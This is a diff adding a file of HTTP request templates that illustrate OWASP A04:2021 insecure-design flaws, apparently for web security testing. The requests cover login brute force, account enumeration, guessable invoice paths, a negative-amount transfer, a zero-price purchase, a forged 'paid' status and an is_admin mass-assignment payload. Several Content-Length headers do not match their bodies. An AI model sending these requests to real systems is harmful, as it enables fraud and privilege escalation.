@@ -1,0 +1,54 @@
+# OWASP Top 10 - A04:2021 Insecure Design
+# Failles de conception
+
+### Missing Rate Limiting - Brute force
+POST /api/login HTTP/1.1
+Host: {{host}}
+Content-Type: application/json
+Content-Length: 45
+
+{"username": "admin", "password": "password1"}
+
+### Account Enumeration
+POST /api/forgot-password HTTP/1.1
+Host: {{host}}
+Content-Type: application/json
+Content-Length: 30
+
+{"email": "admin@example.com"}
+
+### Predictable Resource Location
+GET /invoices/12345.pdf HTTP/1.1
+Host: {{host}}
+
+### Missing Business Logic Validation
+POST /api/transfer HTTP/1.1
+Host: {{host}}
+Content-Type: application/json
+Content-Length: 55
+
+{"from": "user123", "to": "attacker", "amount": -1000}
+
+### Race Condition - Double spending
+POST /api/purchase HTTP/1.1
+Host: {{host}}
+Content-Type: application/json
+Content-Length: 40
+
+{"item_id": 999, "quantity": 1, "price": 0}
+
+### Workflow Bypass - Skip payment
+POST /api/orders/confirm HTTP/1.1
+Host: {{host}}
+Content-Type: application/json
+Content-Length: 35
+
+{"order_id": 123, "payment_status": "paid"}
+
+### Mass Assignment
+POST /api/users HTTP/1.1
+Host: {{host}}
+Content-Type: application/json
+Content-Length: 75
+
+{"username": "newuser", "email": "user@test.com", "is_admin": true}
